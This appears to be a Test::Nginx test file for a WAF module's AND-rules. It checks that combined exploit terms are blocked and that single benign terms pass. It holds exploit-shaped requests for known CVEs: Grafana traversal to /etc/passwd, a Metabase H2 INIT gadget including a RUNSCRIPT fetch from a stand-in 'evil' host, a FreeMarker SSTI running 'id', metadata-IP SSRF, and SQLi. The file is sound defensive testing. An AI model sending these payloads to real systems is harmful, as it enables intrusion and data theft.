# AND-rules: a category that fires only when a SET of terms co-occurs in one
# buffer. Every term here is, on its own, ordinary traffic -- t/05 TESTS 30-34
# pin that each one alone must NOT block. These tests pin the other half: the
# full term set together IS the attack and must block.
#
# The pair is the whole point of the primitive. A signature engine that can
# only match one token at a time has to choose between blocking the product
# (term alone = 403) and missing the exploit (never listed at all).
use Test::Nginx::Socket 'no_plan';

repeat_each(1);
no_long_string();
run_tests();

__DATA__

=== TEST 1: Grafana plugin path + traversal gadget (CVE-2021-43798)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=/public/plugins/graph/../../../../etc/passwd
--- error_code: 403

=== TEST 2: the Grafana rule reports the traversal category
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=/public/plugins/graph/../../../../etc/passwd
--- error_log
category=traversal
--- error_code: 403

=== TEST 3: OFBiz auth bypass -- bypass param steering the control endpoint
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?p=/webtools/control/main&requirePasswordChange=Y
--- error_code: 403

=== TEST 4: Metabase setup-validate carrying an H2 JDBC INIT gadget
# CVE-2023-38646: the H2 connection string runs an INIT script at connect --
# "INIT=CREATE ALIAS ... AS ..." defines a Java-backed function, the RCE
# primitive. That INIT clause is the gadget no installer sends; a bare
# "jdbc:h2:mem:test" DSN is benign (t/05 TEST 73). The rule requires an H2 JDBC
# DSN AND the INIT gadget, both of which are in the body here.
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
{\"token\":\"x\",\"details\":{\"details\":{\"db\":\"zip:/app/metabase.jar\"},\"engine\":\"h2\"},\"url\":\"/api/setup/validate\",\"conn\":\"jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS \$\$ void e(){} \$\$\"}"
--- more_headers
Content-Type: application/json
--- error_log
category=deserial
--- error_code: 403

=== TEST 4b: Metabase H2 INIT gadget via the RUNSCRIPT remote-fetch variant
# The second INIT form: "INIT=RUNSCRIPT FROM '<url>'" pulls remote SQL at
# connect. The "init=" term catches both CREATE ALIAS and RUNSCRIPT.
--- config
    location /t { shield block; shield_body on; empty_gif; }
--- request eval
"POST /t
{\"url\":\"/api/setup/validate\",\"conn\":\"jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil/x.sql'\"}"
--- more_headers
Content-Type: application/json
--- error_code: 403

=== TEST 4c: Metabase H2 INIT gadget in the REALISTIC split shape (S32-2)
# The shape a real CVE-2023-38646 exploit sends: the endpoint is the REQUEST
# TARGET and the H2 INIT gadget is in the JSON body. AND-rule terms must all
# land in one scan buffer -- the URI and the body are scanned independently --
# so while "/api/setup/validate" was a term this rule could not fire on the
# actual exploit at all. TESTs 4/4b passed only because they repeat the
# endpoint INSIDE the body, which no real attacker does.
#
# Probed against a built module before the fix: this request reached upstream.
--- config
    location /api/setup/validate { shield block; shield_body on; empty_gif; }
--- request eval
"POST /api/setup/validate
{\"token\":\"x\",\"details\":{\"details\":{\"db\":\"zip:/app/metabase.jar\"},\"engine\":\"h2\"},\"conn\":\"jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS \$\$ void e(){} \$\$\"}"
--- more_headers
Content-Type: application/json
--- error_log
category=deserial
--- error_code: 403

=== TEST 5: time-based SQLi -- sleep( paired with a SELECT
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?id=1%20and%20(select%20sleep(5))
--- error_code: 403

=== TEST 6: shield_skip on a rule's category disables the rule too
--- config
    location /t { shield block; shield_skip traversal; empty_gif; }
--- request
GET /t?url=/public/plugins/graph/x/y/z/module.js
--- error_code: 200

=== TEST 7: terms split across different requests never accumulate
# `seen` is per-buffer state, not per-connection: one term now and the other
# term in a later request must never combine into a hit.
--- config
    location /t { shield block; empty_gif; }
--- pipelined_requests eval
["GET /t?url=/public/plugins/graph/module.js",
 "GET /t?q=jdbc:h2:mem"]
--- error_code eval
[200, 200]

=== TEST 8: a rule term is not a signature -- detect mode stays quiet on one term
--- config
    location /t { shield detect; empty_gif; }
--- request
GET /t?url=/public/plugins/graph/module.js
--- error_code: 200

=== TEST 9: Jenkins CLI file read -- /cli AND remoting=true (CVE-2024-23897)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/cli?remoting=true
--- error_code: 403

=== TEST 10: /cli alone is a legitimate Jenkins endpoint, not blocked
# The browser CLI uses the websocket transport; only the remoting channel
# carries remoting=true. The endpoint on its own must pass.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/cli
--- error_code: 200

=== TEST 11: VMware Workspace ONE SSTI -- catalog-portal verify AND a FreeMarker interpolation (CVE-2022-22954)
# The real exploit drives the verify route with a FreeMarker interpolation in
# deviceUdid. The rule's gadget term is the interpolation opener "${", not the
# bare word "freemarker" -- the product name is prose that appears in docs and
# support traffic (t/05 TEST 69), the opener has no benign reading.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=/catalog-portal/ui/oauth/verify%3FdeviceUdid%3D%24%7B%22freemarker.template.utility.Execute%22%3Fnew()(%22id%22)%7D
--- error_code: 403

=== TEST 12: the catalog-portal verify endpoint alone is a real route, not blocked
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=/catalog-portal/ui/oauth/verify
--- error_code: 200

=== TEST 13: SSRF wildcard-DNS rebinding -- nip.io AND dash-encoded metadata IP
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=http://169-254-169-254.nip.io/latest/meta-data/
--- error_code: 403

=== TEST 14: the ssrf_wildcard_dns rule reports ssrf_meta
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=http://169-254-169-254.nip.io/latest/meta-data/
--- error_log
category=ssrf_meta
--- error_code: 403

=== TEST 15: nip.io alone is a real developer tool, not blocked
# nip.io resolves <any-ip>.nip.io to <any-ip> for local HTTPS testing -- a
# routine dev/CI use case that must not be blocked on its own.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?callback=http://10.0.0.5.nip.io/webhook
--- error_code: 200

=== TEST 16: ColdFusion cfclient filemanager RCE (CVE-2023-26360)
# The filemanager path AND the _cfclient=true switch, both in the target.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?_cfclient=true&method=getComponentMetaData
--- error_code: 403

=== TEST 17: filemanager path WITHOUT the _cfclient switch is a benign asset fetch
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/edit.html
--- error_code: 200
